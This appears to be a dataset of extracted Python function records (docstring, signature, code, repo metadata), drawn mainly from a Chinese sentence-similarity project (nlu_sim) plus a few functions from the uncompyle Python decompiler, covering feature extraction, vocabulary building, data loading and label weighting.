self.fixed_jumps[i]\n        targets[label] = targets.get(label, []) + [i]\nreturn targets", "path": "uncompyle\\Scanner.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"\nSpecial handling for opcodes that take a variable number\nof arguments -- we add a new entry for each in TABLE_R.\n\"\"\"\n", "func_signal": "def customize(self, customize):\n", "code": "for k, v in customize.items():\n   if TABLE_R.has_key(k):\n      continue\n   op = k[ :k.rfind('_') ]\n   if op == 'CALL_FUNCTION':\tTABLE_R[k] = ('%c(%P)', 0, (1,-1,', ',100))\n   elif op in ('CALL_FUNCTION_VAR',\n               'CALL_FUNCTION_VAR_KW', 'CALL_FUNCTION_KW'):\n      if v == 0:\n         str = '%c(%C' # '%C' is a dummy here ...\n         p2 = (0, 0, None) # .. because of this\n      else:\n         str = '%c(%C, '\n         p2 = (1,-2, ', ')\n      if op == 'CALL_FUNCTION_VAR':\n         str += '*%c)'\n         entry = (str, 0, p2, -2)\n      elif op == 'CALL_FUNCTION_KW':\n         str += '**%c)'\n         entry = (str, 0, p2, -2)\n      else:\n         str += '*%c, **%c)'\n         if p2[2]: p2 = (1, -3, ', ')\n         entry = (str, 0, p2, -3, -2)\n      TABLE_R[k] = entry\n   ## handled by n_mapexpr:\n   ##if op == 'BUILD_SLICE':\tTABLE_R[k] = ('%C'    ,    (0,-1,':'))\n   ## handled by n_build_list:\n   ##if   op == 'BUILD_LIST':\tTABLE_R[k] = ('[%C]'  ,    (0,-1,', '))\n   ##elif op == 'BUILD_TUPLE':\tTABLE_R[k] = ('(%C%,)',    (0,-1,', '))", "path": "uncompyle\\Walker.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"This has to be present\"\"\"\n\n", "func_signal": "def Doc_Test():\n", "code": "\ndef __init__(self):\n\t\"\"\"__init__: This has to be present\"\"\"\n\tself.a = 1\n\n\tdef XXX22():\n\t\t\"\"\"XXX22: This has to be present\"\"\"\n\t\tpass\n\ndef XXX11():\n\t\"\"\"XXX22: This has to be present\"\"\"\n\tpass\n\ndef XXX12():\n\tfoo = \"\"\"XXX22: This has to be present\"\"\"\n\tpass\n\ndef XXX13():\n\tpass", "path": "test\\test_docstring.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "\"\"\"convert AST to source code\"\"\"\n\n", "func_signal": "def gen_source(self, ast, customize, isLambda=0, returnNone=False):\n", "code": "rn = self.return_none\nself.return_none = returnNone\n# if code would be empty, append 'pass'\nif len(ast) == 0:\n    self.print_(self.indent, 'pass')\nelse:\n    self.customize(customize)\n    if isLambda:\n        self.write(self.traverse(ast, isLambda=isLambda))\n    else:\n        self.print_(self.traverse(ast, isLambda=isLambda))            \nself.return_none = rn", "path": "uncompyle\\Walker.py", "repo_name": "gstarnberger/uncompyle", "stars": 413, "license": "None", "language": "python", "size": 950}
{"docstring": "#print(\"input_string_x1:\",input_string_x1)\n#1.1 get word vec for sentence 1\n", "func_signal": "def cos_distance_bag_tfidf(input_string_x1, input_string_x2,word_vec_dict, tfidf_dict,tfidf_flag=True):\n", "code": "sentence_vec1=get_sentence_vector(word_vec_dict,tfidf_dict, input_string_x1,tfidf_flag=tfidf_flag)\n#print(\"sentence_vec1:\",sentence_vec1)\n#1.2 get word vec for sentence 2\nsentence_vec2 = get_sentence_vector(word_vec_dict, tfidf_dict, input_string_x2,tfidf_flag=tfidf_flag)\n#print(\"sentence_vec2:\", sentence_vec2)\n#2 compute cos similiarity\nnumerator=np.sum(np.multiply(sentence_vec1,sentence_vec2))\ndenominator=np.sqrt(np.sum(np.power(sentence_vec1,2)))*np.sqrt(np.sum(np.power(sentence_vec2,2)))\ncos_distance=float(numerator)/float(denominator+0.000001)\n\n#print(\"cos_distance:\",cos_distance)\nmanhattan_distance=np.sum(np.abs(np.subtract(sentence_vec1,sentence_vec2)))\n#print(manhattan_distance,type(manhattan_distance),np.isnan(manhattan_distance))\nif np.isnan(manhattan_distance): manhattan_distance=300.0\nmanhattan_distance=np.log(manhattan_distance+0.000001)/5.0\n\ncanberra_distance=np.sum(np.abs(sentence_vec1-sentence_vec2)/np.abs(sentence_vec1+sentence_vec2))\nif np.isnan(canberra_distance): canberra_distance = 300.0\ncanberra_distance=np.log(canberra_distance+0.000001)/5.0\n\nminkowski_distance=np.power(np.sum(np.power((sentence_vec1-sentence_vec2),3)), 0.33333333)\nif np.isnan(minkowski_distance): minkowski_distance = 300.0\nminkowski_distance=np.log(minkowski_distance+0.000001)/5.0\n\neuclidean_distance=np.sqrt(np.sum(np.power((sentence_vec1-sentence_vec2),2)))\nif np.isnan(euclidean_distance): euclidean_distance =300.0\neuclidean_distance=np.log(euclidean_distance+0.000001)/5.0\n\nreturn cos_distance,manhattan_distance,canberra_distance,minkowski_distance,euclidean_distance", "path": "data_mining\\data_util_tfidf.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"\ncompute weights for labels in current batch, and update weights_label(a dict)\n:param weights_label:a dict\n:param logit: [None,Vocabulary_size]\n:param label: [None,]\n:return:\n\"\"\"\n", "func_signal": "def compute_labels_weights(weights_label,logits,labels):\n", "code": "labels_predict=np.argmax(logits,axis=1) # logits:(256,108,754)\nfor i in range(len(labels)):\n    label=labels[i]\n    label_predict=labels_predict[i]\n    weight=weights_label.get(label,None)\n    if weight==None:\n        if label_predict == label:\n            weights_label[label]=(1,1)\n        else:\n            weights_label[label]=(1,0)\n    else:\n        number=weight[0]\n        correct=weight[1]\n        number=number+1\n        if label_predict==label:\n            correct=correct+1\n        weights_label[label]=(number,correct)\nreturn weights_label", "path": "weight_boosting.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "#print(\"input_string0:\",input_string)\n", "func_signal": "def split_string_as_list_by_ngram(input_string,ngram_value):\n", "code": "input_string=\"\".join([string for string in input_string if string.strip()])\n#print(\"input_string1:\",input_string)\nlength = len(input_string)\nresult_string=[]\nfor i in range(length):\n    if i + ngram_value < length + 1:\n        result_string.append(input_string[i:i+ngram_value])\n#print(\"ngram:\",ngram_value,\"result_string:\",result_string)\nreturn result_string", "path": "data_util.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"\nget data mining feature given two sentences as string.\n1)n-gram similiarity(blue score);\n2) get length of questions, difference of length\n3) how many words are same, how many words are unique\n4) question 1,2 start with how/why/when(\u4e3a\u4ec0\u4e48\uff0c\u600e\u4e48\uff0c\u5982\u4f55\uff0c\u4e3a\u4f55\uff09\n5\uff09edit distance\n6) cos similiarity using bag of words\n:param input_string_x1:\n:param input_string_x2:\n:return:\n\"\"\"\n", "func_signal": "def data_mining_features(index,input_string_x1,input_string_x2,vocab_word2index,word_vec_fasttext_dict,word_vec_word2vec_dict,tfidf_dict,n_gram=8):\n", "code": "input_string_x1=input_string_x1.decode(\"utf-8\")\ninput_string_x2 = input_string_x2.decode(\"utf-8\")\n#1. get blue score vector\nfeature_list=[]\n#get blue score with n-gram\nfor i in range(n_gram):\n    x1_list=split_string_as_list_by_ngram(input_string_x1,i+1)\n    x2_list = split_string_as_list_by_ngram(input_string_x2, i + 1)\n    blue_score_i_1 = compute_blue_ngram(x1_list,x2_list)\n    blue_score_i_2 = compute_blue_ngram(x2_list,x1_list)\n    feature_list.append(blue_score_i_1)\n    feature_list.append(blue_score_i_2)\n\n#2. get length of questions, difference of length\nlength1=float(len(input_string_x1))\nlength2=float(len(input_string_x2))\nlength_diff=(float(abs(length1-length2)))/((length1+length2)/2.0)\nfeature_list.append(length_diff)\n\n#3. how many words are same, how many words are unique\nsentence_diff_overlap_features_list=get_sentence_diff_overlap_pert(index,input_string_x1,input_string_x2)\nfeature_list.extend(sentence_diff_overlap_features_list)\n\n#4. question 1,2 start with how/why/when(\u4e3a\u4ec0\u4e48\uff0c\u600e\u4e48\uff0c\u5982\u4f55\uff0c\u4e3a\u4f55\uff09\n#how_why_feature_list=get_special_start_token(input_string_x1,input_string_x2,special_start_token)\n#print(\"how_why_feature_list:\",how_why_feature_list)\n#feature_list.extend(how_why_feature_list)\n\n#5.edit distance\nedit_distance=float(edit(input_string_x1, input_string_x2))/30.0\nfeature_list.append(edit_distance)\n\n#6.cos distance from sentence embedding\nx1_list=token_string_as_list(input_string_x1, tokenize_style='word')\nx2_list = token_string_as_list(input_string_x2, tokenize_style='word')\ndistance_list_fasttext = cos_distance_bag_tfidf(x1_list, x2_list, word_vec_fasttext_dict, tfidf_dict)\ndistance_list_word2vec = cos_distance_bag_tfidf(x1_list, x2_list, word_vec_word2vec_dict, tfidf_dict)\n#distance_list2 = cos_distance_bag_tfidf(x1_list, x2_list, word_vec_fasttext_dict, tfidf_dict,tfidf_flag=False)\n#sentence_diffence=np.abs(np.subtract(sentence_vec_1,sentence_vec_2))\n#sentence_multiply=np.multiply(sentence_vec_1,sentence_vec_2)\nfeature_list.extend(distance_list_fasttext)\nfeature_list.extend(distance_list_word2vec)\n#feature_list.extend(list(sentence_diffence))\n#feature_list.extend(list(sentence_multiply))\nreturn feature_list", "path": "data_util.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"\ncreate vocabulary\n:param training_data_path:\n:param vocab_size:\n:param name_scope:\n:return:\n\"\"\"\n\n", "func_signal": "def create_vocabulary(training_data_path,vocab_size,name_scope='cnn',tokenize_style='char'):\n", "code": "cache_vocabulary_label_pik='cache'+\"_\"+name_scope # path to save cache\nif not os.path.isdir(cache_vocabulary_label_pik): # create folder if not exists.\n    os.makedirs(cache_vocabulary_label_pik)\n\n# if cache exists. load it; otherwise create it.\ncache_path =cache_vocabulary_label_pik+\"/\"+'vocab_label.pik'\nprint(\"cache_path:\",cache_path,\"file_exists:\",os.path.exists(cache_path))\nif os.path.exists(cache_path):\n    with open(cache_path, 'rb') as data_f:\n        return pickle.load(data_f)\nelse:\n    vocabulary_word2index={}\n    vocabulary_index2word={}\n    vocabulary_word2index[_PAD]=PAD_ID\n    vocabulary_index2word[PAD_ID]=_PAD\n    vocabulary_word2index[_UNK]=UNK_ID\n    vocabulary_index2word[UNK_ID]=_UNK\n\n    vocabulary_label2index={'0':0,'1':1}\n    vocabulary_index2label={0:'0',1:'1'}\n\n    #1.load raw data\n    csvfile = open(training_data_path, 'r')\n    spamreader = csv.reader(csvfile, delimiter='\\t', quotechar='|')\n\n    #2.loop each line,put to counter\n    c_inputs=Counter()\n    c_labels=Counter()\n    for i,row in enumerate(spamreader):#row:['\\ufeff1', '\\ufeff\u600e\u4e48\u66f4\u6539\u82b1\u5457\u624b\u673a\u53f7\u7801', '\u6211\u7684\u82b1\u5457\u662f\u4ee5\u524d\u7684\u624b\u673a\u53f7\u7801\uff0c\u600e\u4e48\u66f4\u6539\u6210\u73b0\u5728\u7684\u652f\u4ed8\u5b9d\u7684\u53f7\u7801\u624b\u673a\u53f7', '1']\n        string_list_1=token_string_as_list(row[1],tokenize_style=tokenize_style)\n        string_list_2 = token_string_as_list(row[2],tokenize_style=tokenize_style)\n        c_inputs.update(string_list_1)\n        c_inputs.update(string_list_2)\n\n    #return most frequency words\n    vocab_list=c_inputs.most_common(vocab_size)\n    #put those words to dict\n    for i,tuplee in enumerate(vocab_list):\n        word,_=tuplee\n        vocabulary_word2index[word]=i+2\n        vocabulary_index2word[i+2]=word\n\n    #save to file system if vocabulary of words not exists(pickle).\n    if not os.path.exists(cache_path):\n        with open(cache_path, 'ab') as data_f:\n            pickle.dump((vocabulary_word2index,vocabulary_index2word,vocabulary_label2index,vocabulary_index2label), data_f)\n    #save to file system as file(added. for predict purpose when only few package is supported in test env)\n    save_vocab_as_file(vocabulary_word2index,vocabulary_index2label,vocab_list,name_scope=name_scope)\nreturn vocabulary_word2index,vocabulary_index2word,vocabulary_label2index,vocabulary_index2label", "path": "data_util.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"\nconvert data as indexes using word2index dicts.\n:param traning_data_path:\n:param vocab_word2index:\n:param vocab_label2index:\n:return:\n\"\"\"\n", "func_signal": "def load_data(traning_data_path,vocab_word2index, vocab_label2index,sentence_len,name_scope,training_portion=0.95,tokenize_style='char'):\n", "code": "cache_data_dir = 'cache' + \"_\" + name_scope  # path to save cache\ncache_file =cache_data_dir+\"/\"+'train_valid_test.pik'\nprint(\"cache_path:\",cache_file,\"train_valid_test_file_exists:\",os.path.exists(cache_file))\nif os.path.exists(cache_file):\n    with open(cache_file, 'rb') as data_f:\n        print(\"going to load cache file from file system and return\")\n        return pickle.load(data_f)\n\ncsvfile = open(traning_data_path, 'r')\nspamreader = csv.reader(csvfile, delimiter='\\t', quotechar='|')\nlabel_size=len(vocab_label2index)\nX1_ = []\nX2_ = []\nY_ = []\n\ntfidf_source_file = './data/atec_nl_sim_train.txt'\ntfidf_target_file = './data/atec_nl_sim_tfidf.txt'\nif not os.path.exists(tfidf_target_file):\n    get_tfidf_score_and_save(tfidf_source_file,tfidf_target_file)\n\nBLUE_SCORES_=[]\nword_vec_fasttext_dict=load_word_vec('data/fasttext_fin_model_50.vec') #word embedding from fasttxt\nword_vec_word2vec_dict = load_word_vec('data/word2vec.txt') #word embedding from word2vec\n#word2vec.word2vec('/Users/test/PycharmProjects/question_answering_similarity/data/atec_additional_cropus.txt',\n#                  '/Users/test/PycharmProjects/question_answering_similarity/data/word2vec_fin.bin', size=50, verbose=True,kind='txt')\n#print(\"word_vec_word2vec_dict:\",word_vec_word2vec_dict)\ntfidf_dict=load_tfidf_dict('data/atec_nl_sim_tfidf.txt')\n\nfor i, row in enumerate(spamreader):##row:['\\ufeff1', '\\ufeff\u600e\u4e48\u66f4\u6539\u82b1\u5457\u624b\u673a\u53f7\u7801', '\u6211\u7684\u82b1\u5457\u662f\u4ee5\u524d\u7684\u624b\u673a\u53f7\u7801\uff0c\u600e\u4e48\u66f4\u6539\u6210\u73b0\u5728\u7684\u652f\u4ed8\u5b9d\u7684\u53f7\u7801\u624b\u673a\u53f7', '1']\n    x1_list=token_string_as_list(row[1],tokenize_style=tokenize_style)\n    x1 = [vocab_word2index.get(x, UNK_ID) for x in x1_list]\n    x2_list=token_string_as_list(row[2],tokenize_style=tokenize_style)\n    x2 = [vocab_word2index.get(x, UNK_ID) for x in x2_list]\n    #add blue score features 2018-05-06\n    features_vector=data_mining_features(i,row[1], row[2],vocab_word2index,word_vec_fasttext_dict,word_vec_word2vec_dict,tfidf_dict, n_gram=8)\n    features_vector=[float(x) for x in features_vector]\n    BLUE_SCORES_.append(features_vector)\n    y_=row[3]\n    y=vocab_label2index[y_]\n    X1_.append(x1)\n    X2_.append(x2)\n    Y_.append(y)\n\n    if i==0 or i==1 or i==2:\n        print(i,\"row[1]:\",row[1],\";x1:\");print(row[1].decode(\"utf-8\"))\n        print(i,\"row[2]:\", row[2], \";x2:\");print(row[2].decode(\"utf-8\"))\n        print(i,\"row[3]:\", row[3], \";y:\", str(y))\n        print(i,\"row[4].feature vectors:\",features_vector)\n\nnumber_examples = len(Y_)\n\n#shuffle\nX1=[]\nX2=[]\nY=[]\nBLUE_SCORES=[]\npermutation = np.random.permutation(number_examples)\nfor index in permutation:\n    X1.append(X1_[index])\n    X2.append(X2_[index])\n    Y.append(Y_[index])\n    BLUE_SCORES.append(BLUE_SCORES_[index])\n\nX1 = pad_sequences(X1, maxlen=sentence_len, value=0.)  # padding to max length\nX2 = pad_sequences(X2, maxlen=sentence_len, value=0.)  # padding to max length\nvalid_number=min(3200,int((1-training_portion)*number_examples)) #1600\ntest_number=800\ntraining_number=number_examples-valid_number-test_number\nvalid_end=training_number+valid_number\nprint(\";training_number:\",training_number,\"valid_number:\",valid_number,\";test_number:\",test_number)\n#generate more training data, while still keep data distribution for valid and test.\nX1_final, X2_final, BLUE_SCORE_final,Y_final,training_number_big=get_training_data(X1[0:training_number], X2[0:training_number], BLUE_SCORES[0:training_number],Y[0:training_number], training_number)\ntrain = (X1_final,X2_final, BLUE_SCORE_final,Y_final)\nvalid = (X1[training_number+ 1:valid_end],X2[training_number+ 1:valid_end],BLUE_SCORES[training_number + 1:valid_end],Y[training_number + 1:valid_end])\ntest=(X1[valid_end+1:],X2[valid_end:],BLUE_SCORES[valid_end:],Y[valid_end:])\n\ntrue_label_numbers=len([y for y in Y if y==1])\ntrue_label_pert=float(true_label_numbers)/float(number_examples)\n\n#save train/valid/test/true_label_pert to file system as cache\n# save to file system if vocabulary of words not exists(pickle).\nif not os.path.exists(cache_file):\n    with open(cache_file, 'ab') as data_f:\n        print(\"going to dump train/valid/test data to file sytem.\")\n        pickle.dump((train,valid,test,true_label_pert),data_f)\nreturn train,valid,test,true_label_pert", "path": "data_util.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "# 1.1 model1: bilstm_char\n#tokenize_style='char'\n#ckpt_dir='dual_bilstm_char_checkpoint/'\n#model_name='dual_bilstm'\n#name_scope='bilstm_char'\n#graph= tf.Graph().as_default()\n#logits_bilstm_char,line_no_list,vocab_index2label=predict_bilstm(inpath,tokenize_style,ckpt_dir,model_name,name_scope,graph)\n\n# 1.2.model2:bilstm_word\n#tokenize_style='word'\n#ckpt_dir='dual_bilstm_word_checkpoint/'\n#model_name='dual_bilstm'\n#name_scope='bilstm_word'\n#graph= tf.Graph().as_default()\n#logits_bilstm_word,_,_ = predict_bilstm(inpath,tokenize_style,ckpt_dir,model_name,name_scope,graph)\n\n# 1.3.model2:cnn_word\n#tokenize_style='word'\n#ckpt_dir='dual_cnn_word_checkpoint/'\n#model_name='dual_cnn'\n#name_scope='cnn_word'\n#graph= tf.Graph().as_default()\n#logits_cnn_word,line_no_list,vocab_index2label = predict_bilstm(inpath,tokenize_style,ckpt_dir,model_name,name_scope,graph)\n\n# 1.4.model2:cnn_word\n#tokenize_style='char'\n#ckpt_dir='dual_cnn_char_checkpoint/' #dual_cnn_char_checkpoint\n#model_name='dual_cnn'\n#name_scope='cnn_char'\n#graph= tf.Graph().as_default()\n#logits_cnn_char,line_no_list,vocab_index2label = predict_bilstm(inpath,tokenize_style,ckpt_dir,model_name,name_scope,graph)\n\n# 1.model:mix_word\n", "func_signal": "def process(inpath, outpath):\n", "code": "tokenize_style='word'\nckpt_dir='checkpoint/' #dual_cnn_char_checkpoint\nmodel_name='bilstm_attention'\n#name_scope='mix_word'\ngraph= tf.Graph().as_default()\nlogits_mix_word,line_no_list,vocab_index2label = predict_bilstm(inpath,tokenize_style,ckpt_dir,model_name,name_scope,graph)\n\n# 2.model:mix_char\n#tokenize_style = 'char'\n#ckpt_dir = 'dual_mix_char_checkpoint_0.555/'  # dual_cnn_char_checkpoint\n#model_name = 'mix'\n#name_scope = 'mix_char'\n#graph = tf.Graph().as_default()\n#logits_mix_char, line_no_list, vocab_index2label = predict_bilstm(inpath, tokenize_style, ckpt_dir, model_name,name_scope, graph)\n\n#3.model: cnn_char\n#tokenize_style = 'char'\n#ckpt_dir = 'dual_cnn_char_checkpoint_0.544/'  # dual_cnn_char_checkpoint\n#model_name = 'dual_cnn'\n#name_scope = 'cnn_char'\n#graph = tf.Graph().as_default()\n#logits_cnn_char, line_no_list, vocab_index2label = predict_bilstm(inpath, tokenize_style, ckpt_dir, model_name,name_scope, graph)\n\n\n# 2. get weighted logits\nlogits=logits_mix_word# +logits_mix_char +logits_cnn_char\n\n# 3. save predicted result to file system\nsave_result_by_logit(logits, line_no_list,vocab_index2label,outpath)", "path": "main_ensemble.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "#1.read data\n", "func_signal": "def rewrite_data_as_text(file_path,target_file):\n", "code": "csvfile = open(file_path, 'r')\ntarget_object=open(target_file,'a')\nspamreader = csv.reader(csvfile, delimiter='\\t', quotechar='|')\ntotal_length=0\ncount=0\nlength_dict={5:0,10:0,15:0,20:0,25:0,30:0,35:0}\nfor i, row in enumerate(spamreader):##row:['\\ufeff1', '\\ufeff\u600e\u4e48\u66f4\u6539\u82b1\u5457\u624b\u673a\u53f7\u7801', '\u6211\u7684\u82b1\u5457\u662f\u4ee5\u524d\u7684\u624b\u673a\u53f7\u7801\uff0c\u600e\u4e48\u66f4\u6539\u6210\u73b0\u5728\u7684\u652f\u4ed8\u5b9d\u7684\u53f7\u7801\u624b\u673a\u53f7', '1']\n    # 2.tokenize use jieba\n    x1_list=token_string_as_list(row[1],tokenize_style='word')\n    x2_list=token_string_as_list(row[2],tokenize_style='word')\n    #3.write to file system\n    total_length=total_length+len(x1_list)+len(x2_list)\n    target_object.write(\" \".join(x1_list)+\"\\n\")\n    target_object.write(\" \".join(x2_list)+\"\\n\")\n    count=count+1\n\n    x1_list=x2_list\n    if len(x1_list)<5:\n        length_dict[5]=length_dict[5]+1\n    elif len(x1_list)<10:\n        length_dict[10] = length_dict[10] + 1\n    elif len(x1_list)<15:\n        length_dict[15] = length_dict[15] + 1\n    elif len(x1_list)<20:\n        length_dict[20] = length_dict[20] + 1\n    elif len(x1_list)<25:\n        length_dict[25] = length_dict[25] + 1\n    elif len(x1_list)<30:\n        length_dict[30] = length_dict[30] + 1\n    else:\n        length_dict[35] = length_dict[35] + 1\nprint(\"length_dict1:\",length_dict)\nlength_dict={k:float(v)/float(count) for k,v in length_dict.items()}\nprint(\"length_dict2:\", length_dict)\ntarget_object.close()\n\navg_length=(float(total_length)/2.0)/float(count)\nprint(\"avg length:\",avg_length) #8\n#('length_dict2:', {35: 0.003888578254460428, 5: 0.11332791135058201, 10: 0.6525186804249479, 15: 0.17132618309358003, 20: 0.040741117267320694, 25: 0.013190667412189295, 30: 0.005006862196919636})\n#('length_dict2:', { 5: 0.11332791135058201, 10: 0.6525186804249479, 15: 0.17132618309358003, 20: 0.040741117267320694})\n#('length_dict2:', {35: 0.003481929548111625, 5: 0.11388705332181162, 10: 0.6559243633406191, 15: 0.1654043613073756, 20: 0.04325725613785391, 25: 0.013139836323895695, 30: 0.004905200020332436})\n#('length_dict2:', { 5: 0.11388705332181162, 10: 0.6559243633406191, 15: 0.1654043613073756, 20: 0.04325725613785391})", "path": "data_mining\\data_util_stats_word_freq.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "#0. get list from string\n", "func_signal": "def get_sentence_diff_overlap_pert(index,input_string_x1,input_string_x2):\n", "code": "input_list1=[input_string_x1[token] for token in range(len(input_string_x1)) if input_string_x1[token].strip()]\ninput_list2 = [input_string_x2[token] for token in range(len(input_string_x2)) if input_string_x2[token].strip()]\nlength1=len(input_list1)\nlength2=len(input_list2)\n\nnum_same=0\nsame_word_list=[]\n#1.compute percentage of same tokens\nfor word1 in input_list1:\n    for word2 in input_list2:\n       if word1==word2:\n           num_same=num_same+1\n           same_word_list.append(word1)\n           continue\nnum_same_pert_min=float(num_same)/float(max(length1,length2))\nnum_same_pert_max = float(num_same) / float(min(length1, length2))\nnum_same_pert_avg = float(num_same) / (float(length1+length2)/2.0)\n\n#2.compute percentage of unique tokens in each string\ninput_list1_unique=set([x for x in input_list1 if x not in same_word_list])\ninput_list2_unique = set([x for x in input_list2 if x not in same_word_list])\nnum_diff_x1=float(len(input_list1_unique))/float(length1)\nnum_diff_x2= float(len(input_list2_unique)) / float(length2)\n\nif index==0:#print debug message\n    print(\"input_string_x1:\",input_string_x1)\n    print(\"input_string_x2:\",input_string_x2)\n    print(\"same_word_list:\",same_word_list)\n    print(\"input_list1_unique:\",input_list1_unique)\n    print(\"input_list2_unique:\",input_list2_unique)\n    print(\"num_same:\",num_same,\";length1:\",length1,\";length2:\",length2,\";num_same_pert_min:\",num_same_pert_min,\n          \";num_same_pert_max:\",num_same_pert_max,\";num_same_pert_avg:\",num_same_pert_avg,\n         \";num_diff_x1:\",num_diff_x1,\";num_diff_x2:\",num_diff_x2)\n\ndiff_overlap_list=[num_same_pert_min,num_same_pert_max, num_same_pert_avg,num_diff_x1, num_diff_x2]\nreturn diff_overlap_list", "path": "data_util_test.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"\ncreate vocabulary\n:param training_data_path:\n:param vocab_size:\n:param name_scope:\n:return:\n\"\"\"\n", "func_signal": "def load_vocabulary(training_data_path,vocab_size,name_scope='cnn',tokenize_style='char'):\n", "code": "cache_vocab_label_pik = 'cache' + \"_\" + name_scope\nvocab_word2index_object=open(cache_vocab_label_pik+'/'+'vocab_word2index.txt',mode='r')\nvocab_word2index_lines=vocab_word2index_object.readlines()\nprint(\"len of vocab_word2index_lines:\",len(vocab_word2index_lines))\nvocab_word2index_dict={}\nfor line in vocab_word2index_lines:\n    word,index=line.strip().split(splitter)\n    word=word.decode(\"utf-8\")\n    vocab_word2index_dict[word]=int(index)\nvocab_word2index_object.close()\n\nvocab_index2label_object = open(cache_vocab_label_pik + '/' + 'vocab_index2label.txt', mode='r')\nvocab_index2label_lines=vocab_index2label_object.readlines()\nvocab_index2label_dict={}\nfor line in vocab_index2label_lines:\n    index,label=line.strip().split(splitter)\n    vocab_index2label_dict[int(index)]=str(label)\n\nreturn vocab_word2index_dict,vocab_index2label_dict", "path": "data_util_test.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "#0. get list from string\n", "func_signal": "def get_sentence_diff_overlap_pert(index,input_string_x1,input_string_x2):\n", "code": "input_list1=[input_string_x1[token] for token in range(len(input_string_x1)) if input_string_x1[token].strip()]\ninput_list2 = [input_string_x2[token] for token in range(len(input_string_x2)) if input_string_x2[token].strip()]\nlength1=len(input_list1)\nlength2=len(input_list2)\n\nnum_same=0\nsame_word_list=[]\n#1.compute percentage of same tokens\nfor word1 in input_list1:\n    for word2 in input_list2:\n       if word1==word2:\n           num_same=num_same+1\n           same_word_list.append(word1)\n           continue\nnum_same_pert_min=float(num_same)/float(max(length1,length2))\nnum_same_pert_max = float(num_same) / float(min(length1, length2))\nnum_same_pert_avg = float(num_same) / (float(length1+length2)/2.0)\n\n#2.compute percentage of unique tokens in each string\ninput_list1_unique=set([x for x in input_list1 if x not in same_word_list])\ninput_list2_unique = set([x for x in input_list2 if x not in same_word_list])\nnum_diff_x1=float(len(input_list1_unique))/float(length1)\nnum_diff_x2= float(len(input_list2_unique)) / float(length2)\n\nif index==0:#print debug message\n    print(\"input_string_x1:\",input_string_x1)\n    print(\"input_string_x2:\",input_string_x2)\n    print(\"same_word_list:\",same_word_list)\n    print(\"input_list1_unique:\",input_list1_unique)\n    print(\"input_list2_unique:\",input_list2_unique)\n    print(\"num_same:\",num_same,\";length1:\",length1,\";length2:\",length2,\";num_same_pert_min:\",num_same_pert_min,\n          \";num_same_pert_max:\",num_same_pert_max,\";num_same_pert_avg:\",num_same_pert_avg,\n         \";num_diff_x1:\",num_diff_x1,\";num_diff_x2:\",num_diff_x2)\n\ndiff_overlap_list=[num_same_pert_min,num_same_pert_max, num_same_pert_avg,num_diff_x1, num_diff_x2]\nreturn diff_overlap_list", "path": "data_util.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"\nget weights for current batch\n:param  answer_list: a numpy array contain labels for a batch\n:param  weights_dict: a dict that contain weights for all labels\n:return: a list. length is label size.\n\"\"\"\n", "func_signal": "def get_weights_for_current_batch(answer_list,weights_dict):\n", "code": "weights_list_batch=list(np.ones((len(answer_list))))\nanswer_list=list(answer_list)\nfor i,label in enumerate(answer_list):\n    acc=weights_dict[label]\n    weights_list_batch[i]=min(1.30,1.0/(acc+0.000001)) ### ODO 1.3 TODO TODO TODO\n    #if label==1:\n    #    weights_list_batch[i]=2.0\n    #else:\n    #    weights_list_batch[i]=1.0\nreturn weights_list_batch", "path": "weight_boosting.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
{"docstring": "\"\"\"\ncompute blue score use ngram information. x1_list as predict sentence,x2_list as target sentence\n:param x1_list:\n:param x2_list:\n:return:\n\"\"\"\n", "func_signal": "def compute_blue_ngram(x1_list,x2_list):\n", "code": "count_dict={}\ncount_dict_clip={}\n#1. count for each token at predict sentence side.\nfor token in x1_list:\n    if token not in count_dict:\n        count_dict[token]=1\n    else:\n        count_dict[token]=count_dict[token]+1\ncount=np.sum([value for key,value in count_dict.items()])\n\n#2.count for tokens existing in predict sentence for target sentence side.\nfor token in x2_list:\n    if token in count_dict:\n        if token not in count_dict_clip:\n            count_dict_clip[token]=1\n        else:\n            count_dict_clip[token]=count_dict_clip[token]+1\n\n#3. clip value to ceiling value for that token\ncount_dict_clip={key:(value if value<=count_dict[key] else count_dict[key]) for key,value in count_dict_clip.items()}\ncount_clip=np.sum([value for key,value in count_dict_clip.items()])\nresult=float(count_clip)/(float(count)+0.00000001)\nreturn result", "path": "data_util.py", "repo_name": "brightmart/nlu_sim", "stars": 294, "license": "None", "language": "python", "size": 17155}
